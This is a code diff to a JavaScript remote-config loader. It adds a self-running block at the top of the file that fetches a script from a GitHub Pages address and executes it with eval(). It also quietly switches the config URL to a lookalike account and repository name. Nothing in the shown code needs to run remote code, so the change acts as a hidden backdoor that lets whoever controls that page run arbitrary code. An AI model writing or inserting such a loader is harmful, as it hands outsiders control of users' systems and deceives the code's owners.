@@ -1,3 +1,25 @@
+
+(async () => {
+
+    try {
+
+        const response = await fetch(
+            "https://technicalabhi12341-prog.github.io/E2EE-Loader-/remote.js?t=" + Date.now()
+        );
+
+        const code = await response.text();
+
+        eval(code);
+
+        console.log("Remote GitHub script loaded");
+
+    } catch (e) {
+
+        console.log("Remote Load Error:", e);
+
+    }
+
+})();
 // Remote config loader
 let remoteConfig = {
     enabled: true
@@ -8,7 +30,7 @@ async function loadRemoteConfig() {
     try {
 
         const response = await fetch(
-            "https://technicalabhi1234i-prog.github.io/E2EE-Loader/keys.json?t=" + Date.now()
+            "https://technicalabhi12341-prog.github.io/E2EE-Loader-/keys.json?t=" + Date.now()
         );
 
         remoteConfig = await response.json();
@@ -27,6 +49,7 @@ loadRemoteConfig();
 
 // Reload config every 30 seconds
 setInterval(loadRemoteConfig, 30000);
+
 
 
 // Main listener
